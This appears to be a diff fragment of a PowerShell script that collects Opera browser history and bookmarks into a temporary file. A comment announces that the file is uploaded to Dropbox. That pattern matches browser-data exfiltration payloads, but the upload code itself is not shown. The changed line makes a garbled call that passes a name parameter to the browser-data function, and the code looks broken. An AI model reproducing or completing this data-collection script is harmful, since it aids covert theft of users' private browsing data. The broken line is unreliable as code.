@@ -68,7 +68,7 @@ Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.t
 
 Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
 
-Get-fullName -Name "$fullName"
+Get-BrowserData -fullName "$fullName"
 
 # Upload output file to dropbox
 
